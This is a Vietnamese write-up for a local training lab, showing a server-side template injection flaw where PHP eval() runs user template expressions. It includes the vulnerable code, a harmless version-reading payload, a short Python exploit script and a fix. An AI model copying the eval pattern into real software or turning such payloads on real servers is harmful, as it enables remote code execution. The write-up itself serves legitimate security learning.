1.Server-Side Template Injection (SSTI)

URL: `http://127.0.0.1/OhMyCrab/modules/ssti/ssti.php`

Ứng dụng tồn tại lỗ hổng SSTI do xử lý biểu thức template do người dùng cung cấp và thực thi trực tiếp bằng `eval()` mà không thực hiện validate hoặc sandbox expression. Attacker có thể chèn biểu thức PHP tùy ý vào template nhằm thực thi code trên server và thao túng logic ứng dụng.

PoC:

- Truy cập chức năng Render Template.

- Nhập payload `{{phpversion()}}`

- Nhấn render và quan sát response trả về.

<img width="553" height="443" alt="image" src="https://github.com/user-attachments/assets/b2333191-5c89-415c-85b8-a6876c091dab" />

- Ứng dụng trả về kết quả: `Result: 8.2.12 `

Điều này chứng minh biểu thức bên trong template đã được server thực thi. Attacker có thể chèn thêm các PHP expression khác để thao túng logic ứng dụng hoặc thực thi code tùy ý trên server.

Phân tích source code

```
$template = "Result: " . $payload;
if (preg_match('/\{\{(.*?)\}\}/', $template, $matches)) {
    $expr = trim($matches[1]);
    $result = eval("return $expr;");
    $template = str_replace($matches[0], $result, $template);
}
```

Ứng dụng nhận dữ liệu template trực tiếp từ người dùng, Regex `preg_match('/\{\{(.*?)\}\}/', ...)` trích xuất expression bên trong `{{  }}`. Giá trị expression được thực thi trực tiếp bằng: `eval()` cho phép thực thi code PHP. Do không tồn tại: sandbox, whitelist expression, validation input nên attacker có thể inject biểu thức tùy ý vào template.

Cách khắc phục

```
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {

        $payload = $_POST['payload'];
        $output = "Result: " . htmlspecialchars($payload, ENT_QUOTES, 'UTF-8');
    }
```

- Ứng dụng loại bỏ hoàn toàn việc thực thi template động bằng eval(), dữ liệu của người dùng không còn được parse như expression/template.

- Input được encode bằng htmlspecialchars() trước khi render ra giao diện.

Script khai thác

```
import requests
import re

url = "http://127.0.0.1/OhMyCrab/modules/ssti/ssti.php"
payload = "{{phpversion()}}"
data = {
    "payload": payload
}
response = requests.post(url, data=data)
match = re.search(r"Result:\s*([0-9.]+)", response.text)
if match:
    php_version = match.group(1)
    print("Khai thác thành công")
    print(f"PHP Version: {php_version}")

else:
    print("[-] Khai thác thất bại")
```

Script gửi payload SSTI tới ứng dụng để thực thi hàm phpversion() trên server và trích xuất trực tiếp phiên bản PHP từ response trả về.
